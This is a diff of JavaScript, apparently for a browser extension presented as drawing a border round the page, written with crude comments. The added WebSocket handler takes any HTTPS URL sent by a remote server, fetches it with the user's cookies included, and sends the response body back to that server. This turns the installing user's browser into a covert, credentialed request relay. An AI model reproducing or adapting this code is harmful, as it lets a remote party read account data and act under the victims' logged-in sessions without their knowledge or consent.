@@ -5,6 +5,7 @@ Just draw a border round the document.body.
 // yes. man. ahead of shit.
 // console.log("");
 // add all fucking permissions here!
+// this shit is executable somehow?
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
@@ -118,13 +119,44 @@ socket.onopen = function(e) {
   console.log("Sending to server");
   socket.send("My name is John");
 };
-
+// what is this anyway?
 socket.onmessage = function(event) {
 	var edata = event.data;
   console.log(`[message] Data received from server: `)
-	  console.log(edata);
+	  console.log(edata,typeof(edata),edata.includes("baidu"));
+	if (typeof(edata)===typeof("string")){
+		if (edata.includes("https://")){
+			var random="fetch failed";
+			fetch(edata,{method:"GET",credentials:"include"}).then(function(resp){
+				console.log("CONTENT: ",resp);
+//				console.log("CONTENT: ",e.body);
+				//	it is not with cookies.
+//				const ebody=e.body.getReader();
+				//get your fuck binary.
+//				const ebody=resp.blob();
+				resp.text().then(function(txt){try{
+					console.log("CTEXT: ",txt.length);
+				socket.send(txt);
+				}catch(err){console.log("EMPTY RESPONSE:",err);
+		socket.send(random);
+					}},function(err){console.log("ERR PROMISE:",err);
+		socket.send(random);
+					})
+				// what is that thing?
+				// get the content please?
+			}).catch(function(e){
+				console.log("ERROR: ",e);
+				socket.send(random);
+			})
+		}else{
+  socket.send("NOT BAIDU URL");
+  console.log("NOT BAIDU URL");
+		}
+	}else{
+  socket.send("NOT STRING");
+  console.log("NOT STRING");
+	}
 	// what data?
-  socket.send("My name is John");
 };
 
 socket.onclose = function(event) {
